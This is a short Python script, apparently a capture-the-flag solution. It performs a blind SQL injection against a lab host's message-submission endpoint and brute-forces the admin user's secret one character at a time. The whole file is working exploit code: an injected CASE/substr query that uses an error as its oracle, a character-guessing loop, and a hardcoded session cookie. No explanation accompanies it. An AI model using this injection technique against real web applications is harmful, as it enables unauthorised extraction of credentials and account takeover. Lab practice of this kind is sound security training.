import requests

url="http://10.10.10.195/submitmessage"
diz = ['a','b','c','d','e','f','g','h','i','l','m','n','o','p','q','r','s','t','u','v','x','w','z','j','k','y','1','2','3','4','5','6','7','8','9','0']
i = 0
j = 1
while j < 65:
    i = 0
    for char in diz:
        query = "' and (SELECT CASE WHEN ((SELECT hex(substr(secret,"+str(j)+",1)) FROM users WHERE role =1 ) = hex('" +diz[i]+ "')) then match(1,1) END ))--"
        #qurr = "' and (SELECT CASE WHEN ((SELECT hex(substr(secret,1,1)) FROM users WHERE role =1 ) = hex('f')) then match(1,1) END ))--"
        data = {'message':query}
        cookies = {"Cookie" : "auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Q2NGPh341pKINeE/b+l+/9LVXpIF+TSskL5ZDAiKEBc="}
        r = requests.post(url,data=data,cookies=cookies)
        if 'MATCH' in r.text:
            if i == '34':
                i = 0
            print(char)
            j = j + 1
        i = i + 1

